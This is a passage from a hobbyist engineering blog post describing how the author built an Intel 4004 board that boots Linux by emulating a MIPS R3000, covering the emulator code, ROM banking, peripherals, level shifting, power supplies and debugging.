<p>How does one even generate a "2-phase nonoverlapping clock"? Intel documents a method using some 9602 one-shots and some transistors to generate the proper clock signals. For the reset signal generator they recommend a 7400 and a transistor and a lot of passives. You can see the schematic here. This is no fun for anyone. Luckily intel also made a chip that does this all for you - the 4201. It can connect directly to a crystal and will divide it down by 7 or by 8, producing a proper 2-phase nonoverlapping clock signals at proper 4004 voltage levels. This chip will also generate a good reset signal for all MCS-04 components and (if using a 4040) help implement single-stepping. This one-chip solution is much nicer than the original one intel recommended, <em>if you can get your hands on a 4201</em>.
</p>
<h3>Some more annoying weirdness</h3>
<p>All MCS-04 components operate at a very strange voltage level: their supply voltage is minus 15 volts. Yes. They also use inverted logic on all pins. To indicate a zero, a pin will be grounded, to indicate a one, a pin will output negative 15V. So to any other chip, even with level shifting, the signals will all appear inverted. Chips do not really care what you call "ground", so instead of thinking that MCS-04 chips need "-15V", it is simpler to think of them needing "-10V" and "+5V" supplies, and they are just missing ground pins. This helps in systems that also contain the 4289, since with this exact setup it can interface to normal 5V [[E]EP]ROMs. This just leaves you with the somewhat-annoying problem of generating a few watts of -10V...
</p>

<h2>Initial planning</h2>
<h3>Let's make a dev board</h3>
<p><a href="https://dmitry.gr/images/4004devBoard.jpg"><img alt="A picture of a protoboard with a few MCS-04 chips on it in sockets and an ATMEGA48 as well" src="https://dmitry.gr/images/4004devBoardSmall.jpg"></a></p><p>To make sure that I could even make a 4004 work correctly, I decided to build a simple dev board on a protoboard. It contained almost the simplest possible 4004 system: a 4201 clock generator with a reset button near it, a 4004 CPU, a single 4002-1 RAM, a 4289 ROM controller, and an ATMEGA48 to act as my ROM. The AVR is fast enough to pretend to be a ROM and easy enough to reprogram in-circuit using AVR ICSP. The board was powered by 5V, and I used an isolated 5V to 10V boost converter module to produce 10V. Its positive output was grounded, giving me a -10V supply to feed to the chips in addition to the +5V I already had.
</p>
<p>My first attempt to turn the board on did not succeed. I set a conservative 100mA limit on my power supply, and the board was clearly trying to draw more. After verifying that, as far as I could tell, I did not mess anything up, I raised the current limit to 500mA and tried again. It worked. My simple program that blinked a LED connected to the output pin 0 of the 4002 via a 2K resistor worked and the LED blinked. Glorious! My first 4004 program worked from my first try!
</p>
<p>Output is pretty easy - the 4002 has output pins. Input is a bit harder. The 4289 does support input, but it needs a tristate buffer since its pins are only inputs when the CPU executes an <span>RDR</span> instruction. It also needs a decoder to properly decide which of the 16 4-bit input ports it is reading. I was determined to avoid both of these things. After some math, I decided that I can make do with 4 input pins total. This means that I do not need any decoders. I also decided that if I put a 1K resistor between my data sources and the 4289, that even if they try to fight, their abilities to hurt each other will be limited by the resistor. This should allow me to avoid needing a tristate buffer. This all turned out to work fine. For my proto board I used a single FET with a resistor as my level shifter. On the final board I used a CD40109B.
</p>
<h3>Emulating my 4004 system</h3>
<p><a href="https://dmitry.gr/images/4004emu.png"><img alt="Screenshot of u4004 - the 4004 emulator that emulated the Linux/4004 board" src="https://dmitry.gr/images/4004emuSmall.png"></a></p><p>I had many doubts that I could fit an entire DECstation2100 emulator into 4KB of 4004 machine code. 4004 is very verbose, and operating on nibbles means that basically any operation ends up needing a loop. I was, however, very determined. To save myself the disappointment of developing hardware only to find that the software is impossible, I decided to start with the software. First, I needed an assembler. I was about halfway through writing my own when I stumbled onto <a href="https://www.retrotechnology.com/restore/a04.html">A04</a>. It had a number of annoying bugs (eg: it errors out when a <span>JCN</span> or an <span>ISZ</span> is on the last bytes of a ROM page, even if their targets are indeed reachable as they are on the next page). A04 had one major benefit - it existed, saving me the trouble of writing my own. 
</p>
<p>My next step was writing a 4004 emulator ("u4004"). This involved some experimentation with the hardware to clarify a few things that had not been clear in the datasheet, for example: how carry flag works in subtraction. Initially the emulator only emulated the 4004 and normal memory, but over time, it grew to properly emulate the complete system I intended to build - a virtual SD card, a virtual SPI UART chip, a virtual VFD, and the same layout of 4002s as I planned to have. This did not take a lot of time, since the 4004 is laughably simple. I do not think it even took a week to write and debug the core of the emulator. Emulating the peripherals took longer, as did writing the code that would parse SPI out of I/O pin states and flag any errors. I <em>REALLY</em> did not want to debug this on real hardware. The closer I could come to it in emulation, the better! Here you can see a screenshot of u4004. It shows the serial console output, the VFD display, and the <span>PC</span> LEDs (more on all this later). It also shows how much real time would pass on a real 740KHz 4004 system to get to the current state.
</p>
<h2>The MIPS emulator</h2>
<h3>Why MIPS</h3>
<p>Of course, Linux cannot and will not boot on a 4004 directly. There is no C compiler targeting the 4004, nor could one be created due to the limitations of the architecture. The amount of ROM and RAM that is addressable is also simply too low. So, <a href="https://dmitry.gr/?r=05.Projects&amp;proj=07.%20Linux%20on%208bit">same as before</a>, I would have to resort to emulation. My initial goal was to fit into 4KB of code, as that is what an unmodified unassisted 4004 can address. 4KB of code is not much at all to emulate a complete system. After studying the options, it became clear that MIPS R3000 would be the winner here. Every other architecture I considered would be harder to emulate in some way. Some architectures had arbitrarily-shifted operands all the time (ARM), some have shitty addressing modes necessitating that they would be slow (RISCV), some would need more than 4KB to even decode instructions (x86), and some were just too complex to emulate in so little space (PPC). ... so ... <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">MIPS again</a>... OK!
</p>
<h3>A start</h3>
<p>I started with emulating just the CPU, to evaluate how much space that would take and help me estimate the feasibility of the project in general. As this was my first time programming in 4004 assembly, I had no feel for how dense the code would be. Initially, I skipped dealing with RAM and just assumed that the "current" MIPS instruction will be in <span>r8:r9:r10:r11:r12:r13:r14:r15</span> registers, MSB-to-LSB. Yup...half of the registers are used just to hold the instruction. I considered using memory for this, but the values would need to be used in many ways in many many places during decode, so that would turn out to be messier. Plus, I still had 8 registers left, that is two more than x86 ever had! Of course, "assume the instruction ends up in registers" is not testable, but that was not yet the goal. Initial dispatch (based on the top 6 bits of instruction) to a 64-entry (128-byte) table of unconditional jumps took 13 instructions, including the <span>JIN</span> that it ends with. So 128 + 13 bytes just for that. That is already 3.4% of the entire code space I had. Not a great start. Top level opcodes 0 and 1 each need another sub-table to decode. One table will have 32 entries and the other will have 64. They will need 12 and 14 instructions respectively to calculate the jump target. Thus once we've more or less handled the majority of the decode, we've used 128 + 128 + 64 + 13 + 12 + 14 = 359 bytes of code space. That is over 1/12 of the entire code space, and we have not yet even executed anything. Yeah... It was, of course, approximately at this point that I realized that this project will be harder than I had anticipated. But, no surrender! 
</p>
<p>MIPS has 32 user-visible registers, of which the first is the zero register, writes to which are ignored. 32x 32-bit registers is 1024 bits of register state. This is 256 nibbles, which, in 4004-land, is one full RAM bank. So there we have it: bank 0 will have MIPS register state. MIPS has a delay slot, so in addition to <span>PC</span> we also need to store <span>NEXT_PC</span> so that we can properly handle branches and the delay slots behind them. As <span>PC</span> is not part of the general 32-register bank, these two account for 16 more nibbles of memory (in bank 1). For memory translation, MIPS has a TLB (read more about that <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">here</a>), where each entry is 8 bytes long and there are 64 entries. This would take up 4 complete memory banks. And to access an SD card we'll need at least a sector-sized buffer (512 bytes), which is also 4 memory banks in 4004 land. So we need at least 10 memory banks‽‽‽ No go! Beyond 4 banks, the 4004 needs extra chips; beyond 8 banks we'd be cheating. There must be another way! I decided to punt this problem to later as well. 
</p>
<p>As I continued writing the emulator, the code memory was filling up fast. Most things took a lot of operations, requiring a lot of loops. Some things were very hard due to the way 4004 works and its lack of status flags. Detecting signed overflow was particularly hard. And, of course, 32x32-&gt;64 multiply was a huge pain. The signed variant was even harder. I was very glad when it was over, at least I was until I had to implement division. In some cases, signed 32-bit division can take up to 80,000 instruction cycles thanks to needing to operate on only a nibble at a time and ISA design of the 4004. That is almost a second of realtime to perform a division. Realizing this gave me an idea to show <span>PC</span> in LEDs, which I will get back to later.
</p>
<h3>Logical ops</h3>
<p>I have never before seen a CPU that lacked ability to do basic logical operations, until I saw the 4004 manual. The 4004 lacks ability to do any of them. There is no logical AND, no logical OR, and no XOR. Intel, helpfully, gives sample code in their 4004 programming manual to implement those logical ops on nibbles, but I was able to produce more compact and faster routines. Nonetheless, it takes <em>dozens of cycles PER NIBBLE</em> to do this! How does one even do this? Observe that if we were to isolate a bit from each operand into a register's lower bit (the higher ones being zero), and then add those registers while input carry flag is zero, the result's bit 1 would only be high is the input's two bits were both ones (<span>AND</span>). The result's bit 0 would only be high if the input's bits differed (<span>XOR</span>). If we did the addition with input carry being one, the result's bit 1 would be high if either of the inputs was a one (<span>OR</span>). This is the basic building block of implementing logical ops in the 4004. The rest is looping and shifting! And then, you remember that each MIPS register is 32 bits long, and a whole lot of cycles are going to go into doing all of this per-bit!
</p>
<p>In addition to the usual suspects of <span>AND</span>, <span>OR</span>, and <span>XOR</span>, MIPS also has <span>NOR</span>. Luckily it is easy to compute in a similar way. One might ask if there is a way to speed this up using some sort of a lookup table? Yes, but a table with 256 entries is 1/16 of the available code space. Three such tables is 3/16. That is a lot of code space to give away in a project where I was not sure I could even make the code fit in as is. So this idea was shelved.
</p>
<h3>Shifts</h3>
<p>MIPS has the usual complement of shifts: left, arithmetic right, and logical right. They can be by a fixed amount (encoded in instruction) or a variable amount (taken from a register). The second part of that is trivial, we can find the right register and read its value. To the emulator, all shifts are by a variable amount between 0 and 31. Again, the 4004 makes this rather hard. The only shifts it has are shifts by one through the carry flag. So to shift a 32 bit value by one bit, we need a loop with 8 iterations. Thus to shift by N bits, we'll need to run that loop N times. This is getting pretty slow, eh? But wait, there is more. Arithmetic shift right requires the new MSB be the same as the last MSB. The 4004 lacks a way to do this easily, so it takes a few extra instructions to set this up every iteration. Thus, shifts are slow, and they get slower as you need to shift by more bits. One could come up with many clever ways to optimize this, but I was optimizing for code size above all else!
</p>
<h3>Space optimization and 4004-specifics</h3>
<p>As you may recall, I mentioned that the 4004 has 4 levels of stack, and that one of them is always used as the current <span>PC</span>. This means that if you call into 4 levels of subroutines, you'll not be able to return all the way out to the last. This is annoying, but palatable. However, this also has another fun consequence. Because the 4004 treats the stack as a 4-entry circular buffer, you <em>CAN</em> have an unbalanced number of calls and returns. I use this to save some space in my code. When a MIPS instruction's destination register is <span>$zero</span>, the result is discarded. For speed and code size, I emulate an actual <span>$zero</span> register, and just ignore writes to it. This is faster and simpler than replacing all reads with zeroes as on MIPS more registers are read than written. Now, you might imagine having a <span>isZeroReg()</span> function, and after it, a conditional jump based on its output. If it says "yes", go handle next instruction; if "no", continue processing the current one. This would be suboptimal, since every callsite would need this conditional jump. My idea is better. My <span>checkZeroReg()</span> just goes to the <span>handle_next_instr</span> label if the destination register is <span>$zero</span>, and does not actually return at all. It only returns back to the caller if the desitnation register is not <span>$zero</span>. This means that every instruction targeting <span>$zero</span> pushes <em>yet another</em> value unto the 4004 stack that will never be popped. However, as long as you do not have too many returns, it is safe to have too many calls. This saves three bytes at every callsite, which there are close to a hundred of. Saves three cycles too! This was a big deal in my increasingly-cramped ROM.
</p>
<p>There is curious little part about emulating MIPS: When, exactly, can you stop working on an instruction that targets the <span>$zero</span> register? For instructions with no side-effects, you can skip doing any work at all. So for example an <span>ADDIU</span> or an <span>SLL</span> can be skipped entirely. This is not true for instruction that might trap, like <span>ADDU</span>. Here, some work is needed up front - to check if the instruction might overflow and thus need to cause an exception. In my emulator I do this check, and then skip the actual addition if the target is <span>$zero</span>. Why someone might have such an instruction in their binary is another question, but as an emulator writer, correctness is important. Memory load instructions are similar. They might cause an exception, so even if they target <span>$zero</span>, the memory translation and access need to be executed to make sure they succeed (or to cause them to fail as they should). The only part that can be skipped is the final copying of the loaded value to the destination register, and the potential sign-extension.
</p>
<h3>Hypercalls</h3>
<p>To connect the MIPS emulator to the outside world, hypercalls are used. This allows me to not have to emulate SCSI disks, for example. The hypercalls are actually the same as in <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">the LinuxCard project</a>. They mainly concern accessing storage using the <span>PVD</span> Linux kernel driver and outputting characters for early boot logging. So far, this is sane...
</p>
<h3>Second-order hypercalls</h3>
<p>But, as I had mentioned, I developed much of this code not on real hardware but on an 4004 emulator I wrote (u4004). This made development easier, since I had not yet even built a board with a real 4004 yet. Indeed it is emulators inside emulators. It is emulators all the way down, in fact. In any case, the 4004 emulator also had hypercalls. Initially, before I properly emulated the SPI-attached SD card, UART chip, PSRAM, and VFD, they literally accessed the host file that pretended to be the SD card and printed to console to display text via hypercalls. This allowed me to focus on the actual emulation bits without worrying about the accessing the real world.
</p>
<h3>It is tight</h3>
<p>By the time the CPU emulation was complete, there was only about 400 bytes of free space left in my code space allowance of 4096 bytes. And there was much left to do. Since I planned to use a paravirtualized disk driver for Linux, the only peripherals I would really need to emulate would be: the DEC bus fault reporter (reports bus fault address), DZ11 (serial port), and DS1287 (real time clock and timer). The first one is simply a register that can be read. Easy enough. The next two were harder. Luckily, I had a normal MIPS emulator that could boot Linux from <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">the LinuxCard project</a>. I started chopping it up to minimize how much emulation is done of each of the peripherals, until I had them both minimized down to almost nothing. For DS1278, Linux was willing to live with it even if all registers read as zeroes, writes were ignored, an interrupt was periodically delivered, and it was deasserted upon reading of a status register. I decided to do just that - deliver an interrupt every 65,536 MIPS instructions to the emulated CPU. On the DZ11, there was a bit more work, but I was able to cut away all the channels except the zeroth, and to simplify much of the logic and remove all receive and transmit buffers. I also cut down the IRQ capabilities of the R3000 CPU. Only two IRQs are used in this system - RTC and UART. I removed the capability for all others to work as a great speed and code size gain.
</p>
<p>With the peripherals successfully minimized, I went on to implement them in 4004 assembly. At this point in time, there was 200 bytes of ROM left, but Linux could boot entirely inside the emulator inside the other emulator! The main problem was that there was no code to actually talk to the real hardware I would have to use: SD card, PSRAM, VFD, UART chip. And 200 bytes is a bit tight for all of that. But, I was determined to try!
</p>
<h3>SD card driver and the last of the ROM space</h3>
<p>So, I added a virtual SD card to u4004, connected to a virtual SPI bus, the three output pins being three pins on a virtual 4002, one input pin being the lowest input on a 4289. I then went on to write what I believe to be the world's smallest SD card driver in existence. It fit into 190 bytes and would successfully init a card, get its size, and allow sector read and write. I also tried this driver on my dev board from earlier, connected to a real SD card, and found that it worked! Woo hoo!
</p>
<p>I had 10 bytes left in my ROM and a lot more code to write. I scrounged hard and made a little more space - 44 bytes of ROM were free. I then re-read all the docs and saw that on reset, every 4002 will zero its memory, so I did not need to spend code clearing memory on boot. This saved another 12 bytes. 56 bytes free! Still, this was clearly not enough for what I had left. Failure!
</p>
<h2>The emulator needs more ROM</h2>
<h3>How to make ROM banking work</h3>
<p>Well, OK. I can have 8192 bytes of ROM, in two banks, flippable by a pin controlled by a 4002. Jumping between them would take a little work, but it could be done. And there would finally be more space! The way the bank switching would work is that after the bank output pin is written using <span>WMP</span>, the next instruction would be fetched from the other bank. This means that the call-gates had to be precisely positioned in both banks. Additionally, 4002 outputs reset to outputting 0, which in MCS-04 means the higher output voltage. Practically, this means that the board would boot from bank 1 and not bank 0. Oh well, that is solvable with a cross-bank jump. Calls between pages are also a bit complicated, since the return value is only valid in the page where it originated. So instead of a <span>JMS</span> to a function, now I'd <span>JMS</span> to a veneer that would switch banks, continue in the other bank, <span>JUN</span> to the function, it would <span>JUN</span> at the end to a return veneer, which would swap the banks back, and only then <span>BBL</span> to return. This mess was necessary to not burn one of only three call depth levels available in the 4004. Messy but it worked!
</p>
<h3>Now that I have space...</h3>
<p>Suddenly I had mode space! So many possibilities opened up! So many pieces of code that had once been optimized for space could now be optimized for speed. There were limits, of course, since jumps between ROM banks were a pain, so only a few things initially got moved. The first were the logical operations. <span>AND</span>, <span>OR</span>, and <span>XOR</span> each got a full 256-entry lookup table in the second ROM bank. How does one implement a lookup table on the 4004? Since the result is a nibble, just a table of <span>BBL</span> instructions is good enough, at a 256-byte boundary. A jump into that ROM page at an index whose high nibble is one input nibble and low nibble is the other input nibble would jump to the <span>BBL</span> that would populate the accumulator with the result. However, if the entire ROM page is filled with <span>BBL</span> instructions, how does one jump to them? Recall that the computed jump instruction <span>JIN</span> had a curious footnote in the manual: if it is the very last instruction in a ROM page, the address that the jump is relative to is not the start of its page but of the next. The 4004 manual warns that this is hard to use and should be avoided! Well, I found it wonderfully easy to use and used it to great success. Then, the functions to <span>AND</span>, <span>OR</span>, or <span>XOR</span> full 32-bit values were simple to implement and ran much faster. 
</p>
<p>Multiplication was another case where a table could help, but this is slightly more complicated. A nibble times a nibble can produce up to a byte of result (<span>0x0f x 0x0f = 0xe1</span>). This means that the trick with a <span>JIN</span> at the end of a page followed by a page full of <span>BBL</span>s with correct value would not work. Well, there is also the <span>FIN</span> instruction which loads a whole byte from ROM into a register pair. In fact, it also has the same quirk with regards to the addressing, so that placing it at the end of a ROM page would indeed allow using the entire next ROM page as data. Wonderful! There is one problem: <span>FIN</span> is not a return statement, so after it performs the load, it will continue executing the next page's data as instructions. This is most unpleasant! There is no way around this in the general case, but I am not seeking to solve the general case. If we imagine a LUT for multiplication, the first 16 entries will be zeroes. So, if we can simply assume that our larger multiplication implementation does not call the LUT for zeroes, then we can simply <span>FIN</span> and then <span>BBL</span> safely. This is what I did, in fact. Multiplication got 8x faster compared to the one-bit-at-a-time implementation I had had before.
</p>
<h2>Hardware</h2>
<p>At this point, it was becoming clear that the project was feasible, and so it was time to build some real hardware! I decided that the final result should be artistic, recall the 1970s, and be able to be hung on a wall and look pretty! The board would be composed of all through-hole components, thick right-angle-only traces and no vias anywhere for a classic look. Moving on to parts selection...
</p>
<h3>SPI PSRAM</h3>
<p>Unlike <a href="https://dmitry.gr/?r=05.Projects&amp;proj=07.%20Linux%20on%208bit">the last time</a> I did this, I had no desire to manually refresh DRAM. Since 2012, wonderful SPI PSRAM chips have appeared from <a href="https://www.apmemory.com/products/psram-iot-ram/">AP MEMORY</a>, <a href="https://www.issi.com/WW/PSearch/USPSearch/Low_Pin_Count_SRAM_PSRAM.aspx">ISSI</a> and <a href="https://www.vilsion.com/list-140-1.html">Vilsion Tech</a>. They are easy to work with and require many fewer pins. I decided I'd use them. They are not through-hole, but they are small and I was willing to compromise. Plus, since I had already written code to do SPI on the 4004, I could reuse it. I wrote an emulator of SPI PSRAM and added it to u4004, so that I could then test my PSRAM driver. It all worked rather well, after I properly remembered that 4002's outputs are inverted. Sadly, emulating a real bit-banged SPI interface slowed the emulation by a factor of two, compared to a magic "fetch an instruction" hypercall I had had. Doing things more realistically is always slower. Fetching an instruction, on average, took longer than emulating it now. Sadly, such is life. I considered using full QSPI mode, but I'd need a lot more input pins than my plan called for. I could easily use a 4265 to do this, and speed gains would be nice, but I sought a project that could be reproduced by others. 4265s are rather hard to get, so I decided to do without it.
</p>
<p>The SPI PSRAM needs time to refresh the internal DRAM, and because of this, there is a minimum time it needs to be left alone between instances of being selected. This would not be hard to meet with my emulator being so slow. It also has a maximum length of time it can be selected, so that it is not blocked from refresh for too long. This limit is 8 msec. I worked hard to meet this time by instrumenting u4004 to keep track of selection length. It is, of course, at this time that I rewrote all the SPI code many times over for speed. Now that I had space in ROM, I also inlined a few uses of it and unrolled some loops. The final clock speed I attained on my bit-banged SPI out a 4002 was about 7.4KHz. Not too fast. Luckily, as per u4004, my longest selection of RAM was 7.4 msec, so I was meeting the datasheet-imposed limit.
</p>
<p>A later re-examination of the datasheet showed a slight issue with all of the above. The unit in the PSRAM datasheet was microseconds, not milliseconds. Oops! So, I was not meeting the timings, I was blowing them by a factor of nearly a thousand! Luckily, this seemed to be causing no issues at room temperature. After some thought, it makes sense. Since there is a lot of time between my accesses, the chip likely has time to do multiple full-array refreshes between each of my selections. I ran a number of tests on an RP2350-based board severely downclocked and found no issues, so I guess it works well enough!
</p>
<h3>The VFD</h3>
<p>I knew that I wanted the final hardware I build to be an art piece that I could hang on a wall, so merely having a serial port would not do. What could add more retro flair than a 40x2 VFD display? In my mind: nothing! I was able to locate a VFD display that could speak SPI and use a single 5V supply - a Futaba M402SD10FJ. After some experimentation, I found that it would also happily run on 3.3V! Even better! The protocol to talk to it was a bit strange, and not quite SPI. It used a single line for both input and output. This required some thinking, electrically, but at the end it was resolvable. Why would I need to read from a display? RAM savings. If I want to scroll the display, I need to copy the bottom line to the top line. There are two ways to do this. One is to buffer it and the other is to read it back. Buffering 40 characters requires spending a whole 4002 chip to do that - that feels like a waste when the display itself can support this functionality. At the end I was able to make it work and the display indeed displays the last two lines of output! It is glorious! One annoyance was that the VFD only operates in SPI mode 3, while all other devices I have use mode 0. Luckily, the assembly changes were minimal to support this, and u4004 was updated to support it too.
</p>
<h3>The UART</h3>
<p>I was not going to implement a full keyboard out of buttons, though. I thought that this would be unsightly, plus I am lazy! I did, however, plan on having a real serial port on the board. There was one problem: despite much searching I found only one through-hole SPI UART chip (the MAX3100), and, sadly it had a fatal flaw. While it supported doing flow-control signaling, it lacked the ability to automatically signal the other side to stop talking when local buffer was full. Instead, its flow control outputs functioned like GPIOs that the host had to control. This was a nonstarter for me, since my host CPU was too slow to do this fast enough. After much soul-searching, I decided that the UART will be the third surface-mount component on this board. Given the option to use an SMT part, I decided on SC16IS741A. It has a large 64-byte buffer and can do flow control automatically, with threshold settings on when to signal stop and when to signal resume. Awesome! I do not use flow control on the TX side since my emulated MIPS CPU simply cannot produce data very fast.
</p>
<p>I emulated the SC16IS741A in u4004 and verified that my code drove it correctly. I wanted to see both the VFD and the outputted serial data, so I wrote my first <a href="https://tldp.org/HOWTO/NCURSES-Programming-HOWTO/" "="">curses</a> UI. It was amazingly easy and I am surprised that it took me this long to discover it!
</p>
<h3>The blinkenlights</h3>
<p>Now that I had curses, I could add more things to u4004. As I have mentioned, the emulator was bound to be rather slow. So, why not, for extra retro flair, show the current <span>PC</span> using 32 LEDs? And if I were to do this, why not also emulate it so that I could verify correctness? I did! For speed, the emulator updates this only every 32 emulated MIPS instruction, which is plenty.
</p>
<h3>The easy level shifting</h3>
<p>I planned to use the <span>TEST</span> pin on the 4004 to indicate that there was a character ready to receive from the UART chip. This would allow easily checking for it, using <span>JCN T</span> conditional jump. This level shift from 5V to 15V was done using a FET and a resistor - simple stuff. 
</p>
<p>To convert my various 3.3V signals to the 5V that the 4289 will accept as inputs, I used a <span>CD40109B</span>. It has a high input resistance and a low output resistance allowing me to play various tricks with resistors on the output and not worry about anything.
</p>
<p>Actual RS232 serial port signaling requires some rather high voltages. There are standard chips for dealing with that, and I chose a cheap through-hole one: <span>HIN232</span>. It just needs a few capacitors to work. It converts two lines in each direction between high voltage inverted and low voltage non-inverted signaling. This allows for transmit, receive, and flow control in both directions to be level-shifted.
</p>
<h3>The hard level-shifting problem</h3>
<p><a href="https://dmitry.gr/images/4004firstRevBoardWithResistorForest.jpg"><img alt="Linux/4004 board with a forest of resistors over it in the air dead-bug style" src="https://dmitry.gr/images/4004firstRevBoardWithResistorForestSmall.jpg"></a></p><p>All that was left was to convert the high-voltage outputs from the 4002s to my 3.3V domain. This turned out to be difficult. My first idea seemed simple but did not work. I reasoned as follows: the input is either -10V or +5V, the output should be either +0V or +3.3V. So if we create a resistor divider with ratio X and the other end of it is at voltage Y, what are the values or X and Y to accomplish the desired result? Two linear equations with two unknowns. Easy. The ratio needs to be around 1:5 and the other voltage needs to be around 2.8V. So, my plan was to use a pretty strong (few dozen ohms) resistor divider to create 2.8V out of my 5V supply, and then use a rather weak resistor divider (few dozen kiloohms) between each 4002 output pin and the 3.3V consumer of its output. This did not work.
</p>
<p>I spent a lot of time wondering why. I recalled a very strange comment in the intel 4002 manual: "This port can be made low power TTL compatible by placing a 12K pull-down resistor to Vdd on each pin." This comment truly made no sense, since Vdd is at minus 10 volts and that is very much not TTL-compatible. I asked around, but found no satisfactory answer to this. When my voltage dividers did not work, I started wondering if what I had tried to do failed because of some mystery that that comment had been alluding to. I measured the raw outputs of the 4002s before my level shifting resistors and noted that while the high voltage output was indeed +5V, the low was not at -10V, instead hovering at -3V. This is rather odd, since there is no -3V supply anywhere in the system, and the only load on the pins was a 30kiloohm resistor. It was starting to look like the 4002 output pins simply could not sink any appreciable current. Maybe this is why intel suggested a pulldown? A better-informed look at the datasheet confirmed this. Intel specifies that the pins will sink 50 microamps only before they start being dragged up to Vss. At 3mA current sunk, they are only promising an output of Vss-4.85V, which is +0.15V - quite far from the -10V we expected! Suddenly it all makes sense. The pins can source plenty of current, and they will happily fight back against a 12K pulldown, but they suck as sinking current, and the pulldown would help them! It now all made sense! I guess "TTL compatible" was intel speak for "able to actually be connected to anything of consequence that is not a high-sensitivity oscilloscope". While I was sorting this all out with a healthy dose of guess-and-check, a lot of resistors sprouted over the board, as you can see in the image of the first-revision board there, in the state where it first fully worked!
</p>
<p>Adding a pulldown, and then using a resistor divider from there ... to another resistor divider was starting to sound needlessly messy, and would likely not work. I came up with a new plan, which will duly horrify any EE. I would add the 10K pulldown, then, the output, via a 2.7K resistor would be used directly, clamped by two diodes, one to +3.3V and one to ground. For high-speed signals this would be problematic, but as MCS-04 chips are quite slow, it would be fine. I prototyped this and it worked well. To save space, I decided to use a TVS instead of 24 diodes. In any case, there was one small remaining problem: diodes have voltage drops, so clamping a signal to ground and +3.3V would in fact produce a signal that varies from -0.65V to +4.15V. Luckily this problem was easy to solve. A 3-resistor divider with low resistances was used to produce +0.65V and +2.65V to feed to the TVS low and high inputs. Did it work? Yes it did! Please take a moment to be truly horrified.
</p>
<h3>Power supplies</h3>
<p>As can be seen, this board was going to have a lot of different voltage levels. I decided to provide power over USB-C edge connector, same as I did <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">before</a>. This takes care of +5V supply. I also needed -10V, and +3.3V. Limiting myself to only through-hole parts made things a bit complicated. Modern switch-mode controllers are very fancy and efficient, but they only come in surface-mount variants. I was stuck with very very old chips - the ones that were famous for being picky about layouts and would fail to work in fun ways if given an inductor or capacitors they did not like. It was a relief when my 3.3V step-down regulator based on LM2574 worked from the very beginning. The draw on it was a few hundred mA, split mainly between the VFD and the SD card. It caused no issues, which was nice.
</p>
<p>My first revision board used a MAX764 as a inverted-step-up regulator. It worked fine for a little bit of early bring-up, but if I populated more than four RAM chips, the board would stop working. After scoping the regulator's output it became clear why - it was drooping from the requisite -10V to -7V. This would not do. After some investigation, it became clear that the MAX764 simply cannot supply all the current needed by this many MCS-04 chips.
</p>
<p>The second revision board used a MAX774, which is basically the same chip as the MAX764, except that the main switch FET can be external, allowing for a beefier one. I also switched to a larger diode and a larger inductor. This worked - all the chips could be powered well. The inductor size is comical, and I asked some people who actually know this stuff why this is, since I've seen plenty of smaller modules that do the same thing I was trying to. The answer was basically that modern chips operate at much higher frequencies (in the MHz), allowing usage of smaller inductors. They are also usually designed by competent EEs, not by me. The MAX774 operates in the KHz frequencies, and thus needs much larger inductors. I was also told that my board layout could be improved, but there was not too much that could be done with through-hole parts and that I should just use a module or some modern regulators.
</p>
<p>It also took some experimentation with inductors and capacitors to find ones that would produce low-enough output ripple while also not making audible noise. I am happy with the final result - it is silent, can supply over 700mA at -10V with under 200mV ripple.

<a name="_TOC_9fbbe48584665bca4a82b5d1a702141b"></a></p><h3>This is the 21st century!</h3>
<p>As you might imagine, the 4004 does not have any built-in debugging capabilities. Luckily, we do not live in the 1970s. You can go and grab yourself one of <a href="https://www.saleae.com/products/saleae-logic-8">these bad boys</a> and capture the entire MCS-04 bus for hours on end. Analyzing it might get a bit annoying, though. This is true especially if you are looking for a bug that happens a few million cycles in. It annoyed me enough that I wrote a decoder for the Saleae Logic Pro software that can decode the MCS-04 bus. It will show bus states, ROM addresses and values read from them, disassembly, and the value read from and written to RAM and I/O. It is part of the downloads at the bottom of the page here. Enjoy!

<h3>The garbled text mystery</h3>
<p><a href="https://dmitry.gr/images/4004corruption.jpg"><img alt="Linux/4004 board with the VFD display showing a corrupted Linux kernel boot console" src="https://dmitry.gr/images/4004corruptionSmall.jpg"></a></p><p>Why did I need to debug the hardware? At some point in time I assembled a new revision 1.1 board. It booted, but the output text was rarely but noticeably corrupted. Some characters, sometimes, would lose their bottom bits. This would convert the letter "i" into "h" sometimes, or a "C" into a "B". This happened rarely, and randomly. Initially I suspected my code for outputting to the serial port and the VFD. But after capturing the bus and analyzing it at depth, I noted that this was not the case. I had to backtrack a few thousand emulated MIPS instructions (a few million 4004 cycles) to see the issue. During a <span>memcpy()</span> in the kernel, a word was loaded into <span>$t1</span> register from memory, it was then, a few MIPS instructions later, written out to another memory location. The copied data, in this case, was text output for <span>printk()</span>. It seemed that the value was being read correctly, and was properly stored into the 4002 where the emulated <span>$t1</span> lived (the second chip). But when it was loaded for the write, the bottom bit was missing. This seemed to indicate an issue with this particular 4002. I replaced it, and, after a day of waiting, I saw the text working properly. It is curious, however, that losing a random bit sometimes when copying memory did not stop Linux from booting. Very curious!
</p><p>I did make a test board to test 4002s to verify the issue. I was able to confirm that the 8th nibble would sometimes lose its bottom bit on this chip. It seemed to happen randomly, not always. No other bits were fragile in this way, and this bit never flipped from a 0 to a 1, only from a 1 to a 0. Strange. But then again, these are DRAM internally, with refresh and all. For all I know, this particular chip could have suffered an ESD strike a decade before I was born... This chip was labeled "retired" and moved to live on a big farm out of town.
</p>


<h2>More MIPS emulator fun</h2>
<h3>Memory translation</h3>
<p>MIPS R3000 has 64 TLB entries, but Linux never does anything that requires this exact TLB entry count. This makes sense since it only uses indices it gets from <span>TLBP</span> (tlb probe) and indices pre-populated by the CPU itself on exception. When it writes a new entry, it uses <span>TLBWR</span>, which writes a <em>random</em> entry. This indicates that Linux might be able to cope with having fewer TLB entries. I tested this, and it worked precisely as expected. I decided to go with 16 entries, since this makes it easy to address each entry with a nibble. This also means that one full RAM bank would store all the TLB state. Cool.
</p>
